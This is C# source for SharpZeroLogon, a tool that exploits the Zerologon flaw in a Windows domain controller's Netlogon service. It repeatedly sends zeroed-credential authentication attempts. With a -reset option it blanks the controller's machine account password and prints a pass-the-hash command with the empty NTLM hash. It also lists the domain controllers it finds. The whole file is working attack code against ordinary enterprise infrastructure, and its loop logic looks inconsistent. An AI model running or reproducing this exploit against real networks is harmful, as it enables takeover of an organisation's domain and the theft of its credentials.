using System;
using static SharpZeroLogon.Netapi32;
using System.DirectoryServices.ActiveDirectory;

namespace SharpZeroLogon
{
    class Program
    {
        /// <summary>
        /// 
        /// </summary>
        /// <param name="args"></param>
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("[-] Usage: SharpZeroLogon.exe <target dc fqdn> <optional: -reset> <optional: -listdc>");
                return;
            }

            bool reset = false;
            bool listdc = false;
            string fqdn = args[0];
            string hostname = fqdn.Split('.')[0];

            foreach (string arg in args)
            {
                switch (arg)
                {
                    case "-reset":
                        reset = true;
                        break;
                    case "-listdc":
                        listdc = true;
                        break;
                }
            }

            if (listdc == true)
            {
                try
                {
                    Domain curDomain = Domain.GetCurrentDomain();
                    using (curDomain)
                    {
                        foreach (DomainController dc in curDomain.FindAllDiscoverableDomainControllers())
                        {
                            using (dc)
                            {
                                Console.WriteLine($"[+] Name : {dc.Name} | IP : {dc.IPAddress} | Forest : {dc.Forest} | OS : {dc.OSVersion}");
                            }
                        }
                    }
                }
                catch
                {
                    Console.WriteLine("[-] Look like this System is not part of a domain");
                }
                return;
            }

            NETLOGON_CREDENTIAL ClientChallenge = new NETLOGON_CREDENTIAL();
            NETLOGON_CREDENTIAL ServerChallenge = new NETLOGON_CREDENTIAL();
            ulong NegotiateFlags = 0x212fffff;

            Console.WriteLine("[+] Performing authentication attempts...");

            for (int i = 0; i < 2000; i++)
            {
                if (I_NetServerReqChallenge(fqdn, hostname, ref ClientChallenge, ref ServerChallenge) != 0)
                {
                    Console.WriteLine("[-] Unable to complete Challenge. Invalid name or DNS issues?");
                    return;
                }
                Console.Write("=");

                if (I_NetServerAuthenticate2(fqdn, hostname + "$", NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
                    hostname, ref ClientChallenge, ref ServerChallenge, ref NegotiateFlags) == 0)
                {
                    Console.WriteLine($"\n[+] Bad or Good news DC {hostname} is vulnerable to Zerologon attack.");
                    return;
                }

                if (reset == true)
                { 
                    NETLOGON_AUTHENTICATOR authenticator = new NETLOGON_AUTHENTICATOR();
                    NL_TRUST_PASSWORD ClearNewPassword = new NL_TRUST_PASSWORD();

                    if (I_NetServerPasswordSet2(
                        fqdn,
                        hostname + "$",
                        NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
                        hostname,
                        ref authenticator,
                        out _,
                        ref ClearNewPassword
                        ) == 0)
                    {
                        Console.WriteLine($"[+] Look like we have a success, NTLM has been Reset with Success :\n Now serveur is exposed => Use : pth {hostname}$ 31d6cfe0d16ae931b73c59d7e0c089c0");
                        return;
                    }
                    Console.Clear();
                    Console.WriteLine("[-] Failed to reset machine account password");
                }
            }
            Console.WriteLine("\n[-] Attack failed. Target is prolly Patched.");
        }
    }
}
